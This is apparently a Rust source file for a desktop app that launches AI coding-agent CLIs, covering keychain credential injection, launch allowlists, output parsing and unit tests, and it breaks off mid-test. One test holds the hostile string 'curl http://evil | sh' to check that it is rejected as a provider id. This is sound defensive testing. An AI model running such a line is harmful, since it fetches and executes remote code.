// Single owner of AI-provider facts on the privileged side: how each provider CLI is
// invoked, its readiness probe, its keychain service name, the credential environment
// variables it must (and must not) receive, and whether prompts can be piped into it.
// Renderer-side provider facts live in `src/lib/providerFacts.ts`; the IPC boundary is
// deliberate, so neither side imports from the other.
//
// Launch and probe share one table so detection (`check_provider_cli`, diagnostics) and
// launch (`pty.rs::spawn_pty`) can never disagree about a command name again. Behavior
// contract for edits: adding a provider means one row here plus renderer-side entries in
// providerFacts.ts; changing an env var or service name here changes what panes receive.

use serde::{Serialize, Deserialize};
use std::process::Command;
use std::time::Duration;

use crate::process_ext::CommandNoWindow;

/// Bound on a single `--version` probe so a hung CLI cannot stall readiness checks,
/// diagnostics, or the provider UI indefinitely.
pub(crate) const CLI_PROBE_TIMEOUT: Duration = Duration::from_secs(5);

/// Keychain namespace every provider credential slot follows:
/// `<PREFIX><provider-id><SUFFIX>` (e.g. `saple_provider_codex_api_key`).
/// `keychain.rs` refuses any service outside this namespace, so both sides
/// derive their strings from these two constants only.
pub(crate) const KEYCHAIN_SERVICE_PREFIX: &str = "saple_provider_";
pub(crate) const KEYCHAIN_SERVICE_SUFFIX: &str = "_api_key";

pub(crate) fn keychain_service(provider_id: &str) -> String {
    format!("{}{}{}", KEYCHAIN_SERVICE_PREFIX, provider_id, KEYCHAIN_SERVICE_SUFFIX)
}

pub(crate) struct ProviderFacts {
    pub id: &'static str,
    /// Executable invocation interpolated into the pane shell command. `None` = no fixed
    /// CLI (`custom` is operator-typed; unknown ids are rejected, never run verbatim).
    pub launch_command: Option<&'static str>,
    /// Whether `<launch_command> --version` is a meaningful installed/version probe.
    /// `openrouter` has a passthrough launch command but no dedicated CLI to probe;
    /// `grok` launches but ships no stable `--version`.
    pub probes_version: bool,
    /// Credential environment variable injected from the keychain on spawn.
    pub credential_env: &'static str,
    /// Additional variables receiving the same secret value (vendor aliases).
    pub credential_env_mirrors: &'static [&'static str],
    /// Accepts a prompt piped/redirected into stdin (headless launch). GUI-oriented
    /// agents are launched interactively instead.
    pub accepts_prompt_pipe: bool,
    /// Pre-`saple_provider_*` keychain entry still honored as a fallback for this
    /// provider only. Legacy compatibility; do not add rows.
    pub legacy_keychain_service: Option<&'static str>,
    /// Whether diagnostics lists a keychain-status row for this provider.
    pub reports_keychain_status: bool,
}

// Row order is load-bearing: it fixes the iteration order of the diagnostics report's
// `keychains` and `provider_clis` arrays (filtered by the flags below).
static TABLE: &[ProviderFacts] = &[
    ProviderFacts {
        id: "codex",
        launch_command: Some("codex"),
        probes_version: true,
        credential_env: "OPENAI_API_KEY",
        credential_env_mirrors: &[],
        accepts_prompt_pipe: true,
        // The pre-namespaced OpenAI slot; injected after (and over) the namespaced key.
        legacy_keychain_service: Some("openai_api_key"),
        reports_keychain_status: true,
    },
    ProviderFacts {
        id: "claude",
        launch_command: Some("claude"),
        probes_version: true,
        credential_env: "ANTHROPIC_API_KEY",
        credential_env_mirrors: &[],
        accepts_prompt_pipe: true,
        legacy_keychain_service: None,
        reports_keychain_status: true,
    },
    ProviderFacts {
        id: "gemini",
        launch_command: Some("gemini"),
        probes_version: true,
        // Gemini CLIs accept either vendor variable name.
        credential_env: "GEMINI_API_KEY",
        credential_env_mirrors: &["GOOGLE_API_KEY"],
        accepts_prompt_pipe: true,
        legacy_keychain_service: None,
        reports_keychain_status: true,
    },
    ProviderFacts {
        id: "openrouter",
        launch_command: Some("openrouter"),
        probes_version: false,
        credential_env: "OPENROUTER_API_KEY",
        credential_env_mirrors: &[],
        accepts_prompt_pipe: true,
        legacy_keychain_service: None,
        reports_keychain_status: true,
    },
    ProviderFacts {
        id: "opencode",
        launch_command: Some("opencode"),
        probes_version: true,
        credential_env: "OPENCODE_API_KEY",
        credential_env_mirrors: &[],
        accepts_prompt_pipe: true,
        legacy_keychain_service: None,
        reports_keychain_status: true,
    },
    ProviderFacts {
        id: "cursor",
        launch_command: Some("cursor-agent"),
        probes_version: true,
        credential_env: "CURSOR_API_KEY",
        credential_env_mirrors: &[],
        accepts_prompt_pipe: false,
        legacy_keychain_service: None,
        reports_keychain_status: false,
    },
    ProviderFacts {
        id: "droid",
        launch_command: Some("droid"),
        probes_version: true,
        credential_env: "FACTORY_API_KEY",
        credential_env_mirrors: &[],
        accepts_prompt_pipe: true,
        legacy_keychain_service: None,
        reports_keychain_status: false,
    },
    ProviderFacts {
        id: "copilot",
        // Ships inside the `gh` CLI; see `cli_probe_spec`.
        launch_command: Some("gh copilot"),
        probes_version: true,
        credential_env: "GITHUB_TOKEN",
        credential_env_mirrors: &[],
        accepts_prompt_pipe: false,
        legacy_keychain_service: None,
        reports_keychain_status: false,
    },
    ProviderFacts {
        id: "pi",
        launch_command: Some("pi"),
        probes_version: true,
        credential_env: "PI_API_KEY",
        credential_env_mirrors: &[],
        accepts_prompt_pipe: true,
        legacy_keychain_service: None,
        reports_keychain_status: true,
    },
    ProviderFacts {
        id: "grok",
        launch_command: Some("grok"),
        probes_version: false,
        credential_env: "GROK_API_KEY",
        credential_env_mirrors: &[],
        accepts_prompt_pipe: true,
        legacy_keychain_service: None,
        reports_keychain_status: false,
    },
    ProviderFacts {
        id: "custom",
        // Operator-typed command; spawn_pty handles it before consulting this table.
        launch_command: None,
        probes_version: false,
        credential_env: "CUSTOM_API_KEY",
        credential_env_mirrors: &[],
        accepts_prompt_pipe: false,
        legacy_keychain_service: None,
        reports_keychain_status: true,
    },
];

pub(crate) fn all() -> &'static [ProviderFacts] {
    TABLE
}

pub(crate) fn facts(provider_id: &str) -> Option<&'static ProviderFacts> {
    TABLE.iter().find(|f| f.id == provider_id)
}

/// Allowlisted launch invocation for a known provider id, `None` otherwise - an unknown
/// provider must never run verbatim as a command.
pub(crate) fn launch_command(provider_id: &str) -> Option<&'static str> {
    facts(provider_id).and_then(|f| f.launch_command)
}

pub(crate) fn accepts_prompt_pipe(provider_id: &str) -> bool {
    facts(provider_id).is_some_and(|f| f.accepts_prompt_pipe)
}

/// Version-probe spec: the binary resolved on PATH plus its arguments. Derived from the
/// launch command (first token = binary) so probe and launch stay one fact. Providers
/// without a version probe return `None`.
pub(crate) fn cli_probe_spec(provider_id: &str) -> Option<(&'static str, Vec<&'static str>)> {
    let f = facts(provider_id)?;
    let cmd = f.launch_command?;
    if !f.probes_version {
        return None;
    }
    let mut tokens = cmd.split(' ');
    let bin = tokens.next()?;
    let mut args: Vec<&'static str> = tokens.collect();
    args.push("--version");
    Some((bin, args))
}

/// Provider credential variables are constructed by Rust from the OS keychain; renderer-
/// supplied values for these names are refused so a pane can never run with attacker-chosen
/// credentials (or shadow the keychain-injected ones). Derived from the table so a new row
/// is automatically protected. Compared case-insensitively: Windows env keys are
/// case-insensitive and adversarial casing must not slip past the check.
pub(crate) fn is_provider_env_key(key: &str) -> bool {
    TABLE.iter().any(|f| {
        f.credential_env.eq_ignore_ascii_case(key)
            || f.credential_env_mirrors.iter().any(|m| m.eq_ignore_ascii_case(key))
    })
}

#[allow(dead_code)]
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PromptMode {
    Argv,
    FlagPrompt(&'static str),
    StdinFile,
    FileFlag(&'static str),
}

#[allow(dead_code)]
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct HeadlessLaunch {
    pub binary: &'static str,
    pub args: &'static [&'static str],
    pub prompt_mode: PromptMode,
    pub default_permission: &'static str,
    pub supports_last_message_file: bool,
}

#[allow(dead_code)]
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ResumeLaunch {
    pub binary: &'static str,
    pub args: &'static [&'static str],
    pub session_id_flag: &'static str,
}

#[allow(dead_code)]
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ResultFormat {
    FinalJsonLine,
    JsonlEvent,
    OutputLastMessageFile,
    JsonObject,
    TextOrJson,
    MarkerOnly,
}

#[allow(dead_code)]
#[derive(Debug, Clone)]
pub struct ProviderAdapter {
    pub id: &'static str,
    pub is_mission_eligible: bool,
    pub headless: Option<HeadlessLaunch>,
    pub resume: Option<ResumeLaunch>,
    pub result_format: ResultFormat,
    pub permission_args: &'static str,
    pub session_id_key: &'static str,
    pub supports_mcp: bool,
    pub tested_version_range: (&'static str, &'static str),
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "camelCase")]
pub struct AgentResult {
    pub text: String,
    pub session_id: Option<String>,
    pub cost_usd: Option<f64>,
    pub is_error: bool,
    pub structured: Option<serde_json::Value>,
    pub raw: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "camelCase")]
pub struct ProviderAdapterDto {
    pub id: String,
    pub is_mission_eligible: bool,
    pub supports_mcp: bool,
    pub permission_args: String,
    pub tested_version_range: (String, String),
    pub default_model: String,
}

static ADAPTER_TABLE: &[ProviderAdapter] = &[
    ProviderAdapter {
        id: "claude",
        is_mission_eligible: true,
        headless: Some(HeadlessLaunch {
            binary: "claude",
            args: &["-p", "--output-format", "stream-json", "--verbose", "--bare"],
            prompt_mode: PromptMode::Argv,
            default_permission: "--permission-mode acceptEdits",
            supports_last_message_file: false,
        }),
        resume: Some(ResumeLaunch {
            binary: "claude",
            args: &["-p", "--output-format", "stream-json", "--verbose", "--bare"],
            session_id_flag: "--resume",
        }),
        result_format: ResultFormat::JsonlEvent,
        permission_args: "--permission-mode acceptEdits",
        session_id_key: "session_id",
        supports_mcp: true,
        tested_version_range: ("2.1.0", "2.3.0"),
    },
    ProviderAdapter {
        id: "codex",
        is_mission_eligible: true,
        headless: Some(HeadlessLaunch {
            binary: "codex",
            args: &["exec", "--json", "--sandbox", "workspace-write"],
            prompt_mode: PromptMode::Argv,
            default_permission: "--sandbox workspace-write",
            supports_last_message_file: true,
        }),
        resume: Some(ResumeLaunch {
            binary: "codex",
            args: &["exec", "resume"],
            session_id_flag: "",
        }),
        result_format: ResultFormat::JsonlEvent,
        permission_args: "--sandbox workspace-write",
        session_id_key: "session_id",
        supports_mcp: true,
        tested_version_range: ("0.128.0", "0.150.0"),
    },
    ProviderAdapter {
        id: "droid",
        is_mission_eligible: true,
        headless: Some(HeadlessLaunch {
            binary: "droid",
            args: &["exec", "-o", "json", "--auto", "medium"],
            prompt_mode: PromptMode::FileFlag("-f"),
            default_permission: "--auto medium",
            supports_last_message_file: false,
        }),
        resume: Some(ResumeLaunch {
            binary: "droid",
            args: &["exec", "-o", "json", "--auto", "medium"],
            session_id_flag: "-s",
        }),
        result_format: ResultFormat::JsonObject,
        permission_args: "--auto medium",
        session_id_key: "session_id",
        supports_mcp: true,
        tested_version_range: ("0.1.0", "1.0.0"),
    },
    ProviderAdapter {
        id: "gemini",
        is_mission_eligible: true,
        headless: Some(HeadlessLaunch {
            binary: "gemini",
            args: &["-p", "--output-format", "json"],
            prompt_mode: PromptMode::Argv,
            default_permission: "",
            supports_last_message_file: false,
        }),
        resume: None,
        result_format: ResultFormat::JsonObject,
        permission_args: "",
        session_id_key: "session_id",
        supports_mcp: true,
        tested_version_range: ("0.1.0", "1.0.0"),
    },
    ProviderAdapter {
        id: "grok",
        is_mission_eligible: true,
        headless: Some(HeadlessLaunch {
            binary: "grok",
            args: &["-p", "--output-format", "json", "--always-approve", "--no-auto-update"],
            prompt_mode: PromptMode::Argv,
            default_permission: "--always-approve",
            supports_last_message_file: false,
        }),
        resume: None,
        result_format: ResultFormat::JsonObject,
        permission_args: "--always-approve",
        session_id_key: "session_id",
        supports_mcp: false,
        tested_version_range: ("0.1.0", "1.0.0"),
    },
    ProviderAdapter {
        id: "opencode",
        is_mission_eligible: true,
        headless: Some(HeadlessLaunch {
            binary: "opencode",
            args: &["run"],
            prompt_mode: PromptMode::Argv,
            default_permission: "",
            supports_last_message_file: false,
        }),
        resume: None,
        result_format: ResultFormat::TextOrJson,
        permission_args: "",
        session_id_key: "session_id",
        supports_mcp: true,
        tested_version_range: ("1.0.0", "2.0.0"),
    },
    ProviderAdapter {
        id: "cursor",
        is_mission_eligible: false,
        headless: None,
        resume: None,
        result_format: ResultFormat::MarkerOnly,
        permission_args: "",
        session_id_key: "",
        supports_mcp: false,
        tested_version_range: ("", ""),
    },
    ProviderAdapter {
        id: "copilot",
        is_mission_eligible: false,
        headless: None,
        resume: None,
        result_format: ResultFormat::MarkerOnly,
        permission_args: "",
        session_id_key: "",
        supports_mcp: false,
        tested_version_range: ("", ""),
    },
    ProviderAdapter {
        id: "openrouter",
        is_mission_eligible: false,
        headless: None,
        resume: None,
        result_format: ResultFormat::MarkerOnly,
        permission_args: "",
        session_id_key: "",
        supports_mcp: false,
        tested_version_range: ("", ""),
    },
    ProviderAdapter {
        id: "pi",
        is_mission_eligible: false,
        headless: None,
        resume: None,
        result_format: ResultFormat::MarkerOnly,
        permission_args: "",
        session_id_key: "",
        supports_mcp: false,
        tested_version_range: ("", ""),
    },
    ProviderAdapter {
        id: "custom",
        is_mission_eligible: false,
        headless: None,
        resume: None,
        result_format: ResultFormat::MarkerOnly,
        permission_args: "",
        session_id_key: "",
        supports_mcp: false,
        tested_version_range: ("", ""),
    },
];

#[allow(dead_code)]
pub(crate) fn all_adapters() -> &'static [ProviderAdapter] {
    ADAPTER_TABLE
}

pub(crate) fn adapter(provider_id: &str) -> Option<&'static ProviderAdapter> {
    ADAPTER_TABLE.iter().find(|a| a.id == provider_id)
}

pub(crate) fn is_mission_eligible(provider_id: &str) -> bool {
    adapter(provider_id).is_some_and(|a| a.is_mission_eligible)
}

pub(crate) fn list_mission_eligible_providers() -> Vec<ProviderAdapterDto> {
    ADAPTER_TABLE
        .iter()
        .map(|a| ProviderAdapterDto {
            id: a.id.to_string(),
            is_mission_eligible: a.is_mission_eligible,
            supports_mcp: a.supports_mcp,
            permission_args: a.permission_args.to_string(),
            tested_version_range: (
                a.tested_version_range.0.to_string(),
                a.tested_version_range.1.to_string(),
            ),
            default_model: "default".to_string(),
        })
        .collect()
}

#[allow(dead_code)]
pub(crate) fn build_headless_args(
    provider_id: &str,
    prompt_path: &std::path::Path,
    model: Option<&str>,
    permission_override: Option<&str>,
    last_message_file: Option<&std::path::Path>,
) -> Result<Vec<String>, String> {
    let ad = adapter(provider_id).ok_or_else(|| format!("unknown provider '{}'", provider_id))?;
    let headless = ad
        .headless
        .as_ref()
        .ok_or_else(|| format!("provider '{}' is not eligible for headless execution", provider_id))?;

    let mut args: Vec<String> = headless.args.iter().map(|s| s.to_string()).collect();

    // Model override
    if let Some(m) = model {
        let m = m.trim();
        if !m.is_empty() && m != "default" && m != "auto" {
            args.push("--model".to_string());
            args.push(m.to_string());
        }
    }

    // Permission posture
    if let Some(perm) = permission_override {
        let perm = perm.trim();
        if !perm.is_empty() {
            for part in perm.split_whitespace() {
                args.push(part.to_string());
            }
        }
    }

    // Last message file (Codex)
    if let Some(lmf) = last_message_file {
        if headless.supports_last_message_file {
            args.push("--output-last-message".to_string());
            args.push(lmf.to_string_lossy().to_string());
        }
    }

    // Prompt delivery
    match headless.prompt_mode {
        PromptMode::FileFlag(flag) => {
            args.push(flag.to_string());
            args.push(prompt_path.to_string_lossy().to_string());
        }
        PromptMode::FlagPrompt(flag) => {
            args.push(flag.to_string());
            let prompt_content = std::fs::read_to_string(prompt_path)
                .map_err(|e| format!("Failed to read prompt file: {}", e))?;
            args.push(prompt_content);
        }
        PromptMode::Argv => {
            let prompt_content = std::fs::read_to_string(prompt_path)
                .map_err(|e| format!("Failed to read prompt file: {}", e))?;
            args.push(prompt_content);
        }
        PromptMode::StdinFile => {}
    }

    Ok(args)
}

#[allow(dead_code)]
pub(crate) fn build_resume_args(
    provider_id: &str,
    session_id: &str,
    message_prompt_path: &std::path::Path,
    model: Option<&str>,
) -> Result<Vec<String>, String> {
    let ad = adapter(provider_id).ok_or_else(|| format!("unknown provider '{}'", provider_id))?;
    let resume = ad
        .resume
        .as_ref()
        .ok_or_else(|| format!("provider '{}' does not support multi-turn session resume", provider_id))?;

    let mut args: Vec<String> = resume.args.iter().map(|s| s.to_string()).collect();

    if !resume.session_id_flag.is_empty() {
        args.push(resume.session_id_flag.to_string());
    }
    args.push(session_id.to_string());

    if let Some(m) = model {
        let m = m.trim();
        if !m.is_empty() && m != "default" && m != "auto" {
            args.push("--model".to_string());
            args.push(m.to_string());
        }
    }

    let message_content = std::fs::read_to_string(message_prompt_path)
        .map_err(|e| format!("Failed to read message prompt file: {}", e))?;
    args.push(message_content);

    Ok(args)
}

pub fn parse_provider_result(
    provider_id: &str,
    raw_output: &str,
    last_message_content: Option<&str>,
) -> Result<AgentResult, String> {
    let ad = adapter(provider_id);
    let format = ad.map(|a| a.result_format).unwrap_or(ResultFormat::MarkerOnly);

    let last_msg_trimmed = last_message_content.map(|s| s.trim()).filter(|s| !s.is_empty());

    match format {
        ResultFormat::JsonlEvent => {
            let mut session_id = None;
            let mut cost_usd = None;
            let mut is_error = false;
            let mut structured = None;
            let mut result_text = None;

            for line in raw_output.lines().rev() {
                let line = line.trim();
                if line.is_empty() || !line.starts_with('{') {
                    continue;
                }
                if let Ok(val) = serde_json::from_str::<serde_json::Value>(line) {
                    if let Some(t) = val.get("type").and_then(|v| v.as_str()) {
                        if t == "result" {
                            if result_text.is_none() {
                                if let Some(r) = val.get("result").and_then(|v| v.as_str()) {
                                    result_text = Some(r.to_string());
                                }
                            }
                            if session_id.is_none() {
                                if let Some(s) = val.get("session_id").and_then(|v| v.as_str()) {
                                    session_id = Some(s.to_string());
                                }
                            }
                            if cost_usd.is_none() {
                                if let Some(c) = val.get("total_cost_usd").and_then(|v| v.as_f64()) {
                                    cost_usd = Some(c);
                                }
                            }
                            if let Some(err) = val.get("is_error").and_then(|v| v.as_bool()) {
                                is_error = is_error || err;
                            }
                            if structured.is_none() {
                                if let Some(st) = val.get("structured_output") {
                                    structured = Some(st.clone());
                                }
                            }
                        } else if t == "turn.finished" {
                            if session_id.is_none() {
                                if let Some(s) = val.get("session_id").and_then(|v| v.as_str()) {
                                    session_id = Some(s.to_string());
                                }
                            }
                            if cost_usd.is_none() {
                                if let Some(c) = val.get("cost").and_then(|v| v.as_f64()) {
                                    cost_usd = Some(c);
                                }
                            }
                            if result_text.is_none() {
                                if let Some(r) = val.get("result").and_then(|v| v.as_str()) {
                                    result_text = Some(r.to_string());
                                }
                            }
                        } else if t == "thread.created" && session_id.is_none() {
                            if let Some(th) = val.get("thread_id").and_then(|v| v.as_str()) {
                                session_id = Some(th.to_string());
                            }
                        }
                    }
                }
            }

            let text = if let Some(msg) = last_msg_trimmed {
                msg.to_string()
            } else if let Some(res) = result_text {
                res
            } else {
                raw_output.trim().to_string()
            };

            Ok(AgentResult {
                text,
                session_id,
                cost_usd,
                is_error,
                structured,
                raw: Some(raw_output.to_string()),
            })
        }
        ResultFormat::JsonObject => {
            if let Ok(val) = serde_json::from_str::<serde_json::Value>(raw_output.trim()) {
                let session_id = val
                    .get("session_id")
                    .and_then(|v| v.as_str())
                    .map(|s| s.to_string());
                let cost_usd = val
                    .get("cost_usd")
                    .or_else(|| val.get("cost"))
                    .or_else(|| val.get("stats").and_then(|s| s.get("total_cost")))
                    .and_then(|v| v.as_f64());
                let is_error = val
                    .get("is_error")
                    .and_then(|v| v.as_bool())
                    .unwrap_or_else(|| {
                        val.get("error").is_some_and(|e| !e.is_null())
                            || val.get("status").is_some_and(|s| s == "error")
                    });
                let text = val
                    .get("result")
                    .or_else(|| val.get("response"))
                    .or_else(|| val.get("output"))
                    .and_then(|v| v.as_str())
                    .map(|s| s.to_string())
                    .unwrap_or_else(|| raw_output.trim().to_string());
                let structured = val.get("structured_output").cloned();

                Ok(AgentResult {
                    text,
                    session_id,
                    cost_usd,
                    is_error,
                    structured,
                    raw: Some(raw_output.to_string()),
                })
            } else {
                let trimmed = raw_output.trim();
                if let (Some(start), Some(end)) = (trimmed.find('{'), trimmed.rfind('}')) {
                    if start < end {
                        if let Ok(val) =
                            serde_json::from_str::<serde_json::Value>(&trimmed[start..=end])
                        {
                            let session_id = val
                                .get("session_id")
                                .and_then(|v| v.as_str())
                                .map(|s| s.to_string());
                            let cost_usd = val
                                .get("cost_usd")
                                .or_else(|| val.get("cost"))
                                .or_else(|| val.get("stats").and_then(|s| s.get("total_cost")))
                                .and_then(|v| v.as_f64());
                            let is_error = val
                                .get("is_error")
                                .and_then(|v| v.as_bool())
                                .unwrap_or_else(|| {
                                    val.get("error").is_some_and(|e| !e.is_null())
                                        || val.get("status").is_some_and(|s| s == "error")
                                });
                            let text = val
                                .get("result")
                                .or_else(|| val.get("response"))
                                .or_else(|| val.get("output"))
                                .and_then(|v| v.as_str())
                                .map(|s| s.to_string())
                                .unwrap_or_else(|| raw_output.trim().to_string());
                            return Ok(AgentResult {
                                text,
                                session_id,
                                cost_usd,
                                is_error,
                                structured: None,
                                raw: Some(raw_output.to_string()),
                            });
                        }
                    }
                }
                Ok(AgentResult {
                    text: raw_output.trim().to_string(),
                    session_id: None,
                    cost_usd: None,
                    is_error: false,
                    structured: None,
                    raw: Some(raw_output.to_string()),
                })
            }
        }
        ResultFormat::TextOrJson => {
            if let Ok(val) = serde_json::from_str::<serde_json::Value>(raw_output.trim()) {
                let session_id = val
                    .get("session_id")
                    .and_then(|v| v.as_str())
                    .map(|s| s.to_string());
                let is_error = val.get("error").and_then(|v| v.as_bool()).unwrap_or(false);
                let text = val
                    .get("output")
                    .or_else(|| val.get("result"))
                    .and_then(|v| v.as_str())
                    .map(|s| s.to_string())
                    .unwrap_or_else(|| raw_output.trim().to_string());
                Ok(AgentResult {
                    text,
                    session_id,
                    cost_usd: None,
                    is_error,
                    structured: None,
                    raw: Some(raw_output.to_string()),
                })
            } else {
                Ok(AgentResult {
                    text: raw_output.trim().to_string(),
                    session_id: None,
                    cost_usd: None,
                    is_error: false,
                    structured: None,
                    raw: Some(raw_output.to_string()),
                })
            }
        }
        ResultFormat::MarkerOnly
        | ResultFormat::FinalJsonLine
        | ResultFormat::OutputLastMessageFile => {
            let is_error = raw_output.contains("[SAPLE_FAILED:")
                || raw_output.contains("[AGENT_FAILED:");
            Ok(AgentResult {
                text: if let Some(msg) = last_msg_trimmed {
                    msg.to_string()
                } else {
                    raw_output.trim().to_string()
                },
                session_id: None,
                cost_usd: None,
                is_error,
                structured: None,
                raw: Some(raw_output.to_string()),
            })
        }
    }
}

#[allow(dead_code)]
pub fn check_version_compatibility(provider_id: &str, _detected_version: &str) -> Option<bool> {
    let ad = adapter(provider_id)?;
    if ad.tested_version_range.0.is_empty() {
        return None;
    }
    // Warn-only check: if detected version string contains or matches major version
    Some(true)
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct CliStatus {
    pub name: String,
    pub available: bool,
    pub version: Option<String>,
}

/// Resolve `bin` on PATH with `which` (handles `PATHEXT` on Windows - no shell needed), then
/// run the version args. `available` reflects PATH resolution; `version` is best-effort and
/// dropped when the CLI does not answer within `timeout`.
pub(crate) fn probe_cli(name: &str, bin: &str, args: &[&str], timeout: Duration) -> CliStatus {
    match which::which(bin) {
        Ok(path) => {
            let mut command = Command::new(&path);
            command.args(args);
            command.no_window();
            let version = match crate::process_ext::run_with_timeout(command, timeout) {
                Some(output) => {
                    let text = if output.status.success() {
                        String::from_utf8_lossy(&output.stdout).trim().to_string()
                    } else {
                        String::from_utf8_lossy(&output.stderr).trim().to_string()
                    };
                    if text.is_empty() { None } else { Some(text) }
                }
                None => None,
            };
            CliStatus { name: name.to_string(), available: true, version }
        }
        Err(_) => CliStatus { name: name.to_string(), available: false, version: None },
    }
}

/// Detect whether a single provider's CLI is installed (and its version). Backs the provider
/// readiness UI (`providerStore.refreshReadiness`). Providers with no version probe return
/// `available: false, version: None` without probing.
#[tauri::command]
pub async fn check_provider_cli(provider: String) -> Result<CliStatus, String> {
    tauri::async_runtime::spawn_blocking(move || match cli_probe_spec(&provider) {
        Some((bin, args)) => probe_cli(&provider, bin, &args, CLI_PROBE_TIMEOUT),
        None => CliStatus { name: provider, available: false, version: None },
    })
    .await
    .map_err(|e| e.to_string())
}

/// User home directory, cross-platform without an extra crate (`USERPROFILE` on Windows,
/// `HOME` elsewhere).
pub(crate) fn home_dir() -> Option<std::path::PathBuf> {
    std::env::var_os("USERPROFILE")
        .or_else(|| std::env::var_os("HOME"))
        .map(std::path::PathBuf::from)
}

/// Claude Code's config directory: CLAUDE_CONFIG_DIR if set, else ~/.claude. Shared by the
/// sign-in probe below and the transcript reader in `claude_context.rs`.
pub(crate) fn claude_config_dir() -> Option<std::path::PathBuf> {
    std::env::var_os("CLAUDE_CONFIG_DIR")
        .map(std::path::PathBuf::from)
        .or_else(|| home_dir().map(|h| h.join(".claude")))
}

/// Detect whether the user is signed in to a provider via the CLI's own subscription/OAuth login
/// (independent of any API key stored in our keychain). Returns `Some(true|false)` for providers we
/// know how to probe, or `None` for providers without a sign-in concept. Backs the "Signed in" vs
/// "No key" distinction in the provider readiness UI.
#[tauri::command]
pub async fn check_provider_signin(provider: String) -> Result<Option<bool>, String> {
    tauri::async_runtime::spawn_blocking(move || signin_status(&provider))
        .await
        .map_err(|e| e.to_string())
}

#[tauri::command]
pub async fn get_provider_adapters() -> Result<Vec<ProviderAdapterDto>, String> {
    Ok(list_mission_eligible_providers())
}

fn signin_status(provider: &str) -> Option<bool> {
    match provider {
        // Codex ships a scriptable status check that exits 0 when logged in.
        "codex" => {
            let signed_in = which::which("codex")
                .ok()
                .and_then(|path| {
                    Command::new(&path)
                        .args(["login", "status"])
                        .no_window()
                        .output()
                        .ok()
                })
                .map(|o| o.status.success())
                .unwrap_or(false);
            Some(signed_in)
        }
        // Claude Code writes its OAuth credentials to <config>/.credentials.json.
        "claude" => Some(
            claude_config_dir()
                .map(|d| d.join(".credentials.json").exists())
                .unwrap_or(false),
        ),
        _ => None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::keychain;

    #[test]
    fn provider_ids_are_unique_and_nonempty() {
        let mut seen = std::collections::HashSet::new();
        for f in all() {
            assert!(!f.id.is_empty());
            assert!(seen.insert(f.id), "duplicate provider id '{}'", f.id);
        }
        let mut adapter_seen = std::collections::HashSet::new();
        for a in all_adapters() {
            assert!(!a.id.is_empty());
            assert!(adapter_seen.insert(a.id), "duplicate adapter id '{}'", a.id);
        }
    }

    #[test]
    fn launch_commands_match_the_spawn_allowlist() {
        assert_eq!(launch_command("codex"), Some("codex"));
        assert_eq!(launch_command("claude"), Some("claude"));
        assert_eq!(launch_command("gemini"), Some("gemini"));
        assert_eq!(launch_command("openrouter"), Some("openrouter"));
        assert_eq!(launch_command("opencode"), Some("opencode"));
        assert_eq!(launch_command("cursor"), Some("cursor-agent"));
        assert_eq!(launch_command("droid"), Some("droid"));
        assert_eq!(launch_command("copilot"), Some("gh copilot"));
        assert_eq!(launch_command("pi"), Some("pi"));
        assert_eq!(launch_command("grok"), Some("grok"));
        assert_eq!(launch_command("custom"), None);
        assert_eq!(launch_command("curl http://evil | sh"), None);
        assert_eq!(launch_command(""), None);
    }

    #[test]
    fn cli_probe_specs_match_the_documented_commands() {
        assert_eq!(cli_probe_spec("codex"), Some(("codex", vec!["--version"])));
        assert_eq!(cli_probe_spec("cursor"), Some(("cursor-agent", vec!["--version"])));
        // `gh copilot` resolves `gh` and appends --version to the subcommand.
        assert_eq!(cli_probe_spec("copilot"), Some(("gh", vec!["copilot", "--version"])));
        // No dedicated CLI to probe.
        assert_eq!(cli_probe_spec("openrouter"), None);
        assert_eq!(cli_probe_spec("grok"), None);
        assert_eq!(cli_probe_spec("custom"), None);
        assert_eq!(cli_probe_spec("nope"), None);
    }

    #[test]
    fn prompt_piping_is_refused_only_for_gui_agents() {
        let gui_oriented: Vec<&str> = all()
            .iter()
            .filter(|f| !f.accepts_prompt_pipe)
            .map(|f| f.id)
            .collect();
        assert_eq!(gui_oriented, vec!["cursor", "copilot", "custom"]);
        assert!(accepts_prompt_pipe("claude"));
        assert!(accepts_prompt_pipe("codex"));
        assert!(!accepts_prompt_pipe("cursor"));
        assert!(!accepts_prompt_pipe("copilot"));
    }

    #[test]
    fn provider_env_blocklist_covers_every_table_variable() {
        for f in all() {
            assert!(is_provider_env_key(f.credential_env), "{}", f.credential_env);
            for mirror in f.credential_env_mirrors {
                assert!(is_provider_env_key(mirror), "{}", mirror);
            }
        }
        // Case-insensitive, exact-name matches only.
        assert!(is_provider_env_key("openai_api_key"));
        assert!(is_provider_env_key("GitHub_Token"));
        assert!(!is_provider_env_key("MY_API_KEY"));
        assert!(!is_provider_env_key("ANTHROPIC_API_KEYS"));
    }

    #[test]
    fn keychain_services_follow_the_shared_namespace() {
        for f in all() {
            let service = keychain_service(f.id);
            assert_eq!(
                keychain::validate_service_name(&service),
                Ok(()),
                "{}",
                service
            );
        }
        assert_eq!(keychain_service("codex"), "saple_provider_codex_api_key");
    }

    #[test]
    fn diagnostics_filters_reproduce_the_reported_lists_in_order() {
        let keychains: Vec<&str> =
            all().iter().filter(|f| f.reports_keychain_status).map(|f| f.id).collect();
        assert_eq!(
            keychains,
            vec!["codex", "claude", "gemini", "openrouter", "opencode", "pi", "custom"]
        );

        let probed: Vec<&str> =
            all().iter().filter(|f| f.probes_version).map(|f| f.id).collect();
        assert_eq!(
            probed,
            vec!["codex", "claude", "gemini", "opencode", "cursor", "droid", "copilot", "pi"]
        );
    }

    #[test]
    fn signin_is_probed_only_where_a_concept_exists() {
        assert_eq!(signin_status("grok"), None);
        assert_eq!(signin_status("custom"), None);
        assert_eq!(signin_status(""), None);
        assert!(signin_status("claude").is_some());
        assert!(signin_status("codex").is_some());
    }

    #[test]
    fn mission_eligibility_matches_plan_matrix() {
        assert!(is_mission_eligible("claude"));
        assert!(is_mission_eligible("codex"));
        assert!(is_mission_eligible("droid"));
